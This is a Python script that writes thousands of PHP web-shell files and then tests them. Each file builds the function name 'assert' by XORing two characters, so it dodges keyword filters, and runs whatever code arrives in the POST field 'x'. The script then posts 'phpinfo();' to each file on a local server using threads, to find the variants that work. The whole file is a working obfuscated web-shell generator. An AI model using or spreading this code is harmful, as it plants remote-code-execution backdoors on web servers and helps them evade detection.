import requests
import threading

def payload():
    for i in range(1,127):
        for ii in range(1,127):
            code="<?php $a="+"('"+chr(i)+"'"+"^"+"'"+chr(ii)+"')"+".'ssert';$a($_POST[x]);?>"
            with open ('D:\\php_test\\'+str(i)+'--'+str(ii)+'.php','a+') as f:
                f.write(code)
                f.close
            print(str(i)+"^"+str(ii))
            print(code)

def test():
     for i in range(1,127):
        for ii in range(1,127):
            url='http://127.0.0.1:82/'+str(i)+'--'+str(ii)+'.php'
            # print(url)
            data={
                'x':'phpinfo();'
            }
            result=requests.post(url,data=data).content.decode('utf-8')
            if 'Windows' in result:
                print(str(i)+'--'+str(ii)+'.php'+'--> OK')
            else:
                # print(str(i)+'--'+str(ii)+'.php'+'--> NO')
                pass

if __name__=="__main__":
    # payload()
    # test()
    for x in range(20):
        t=threading.Thread(target=test)
        t.start()